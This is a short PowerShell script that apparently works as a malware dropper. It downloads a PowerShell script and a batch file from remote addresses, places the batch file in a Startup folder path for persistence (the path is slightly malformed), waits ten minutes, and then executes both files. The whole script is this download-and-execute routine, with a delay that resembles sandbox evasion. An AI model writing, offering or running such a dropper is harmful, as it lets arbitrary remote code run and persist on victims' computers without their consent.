$urlPS = "<link>"
$outputPS = "$Env:UserProfile\temp\maxlolz.ps1"

$urlCMD = "<link>"
$outputCMD = "$Env:UserProfile\temp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getitgoin.cmd"

# Download the files
Invoke-WebRequest -Uri $urlPS -OutFile $outputPS
Invoke-WebRequest -Uri $urlCMD -OutFile $outputCMD

# Execute it in 10 minutes :)

Start-Sleep -s 600
invoke-item "$Env:UserProfile\temp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\getitgoin.cmd"
invoke-item "$Env:UserProfile\temp\maxlolz.ps1"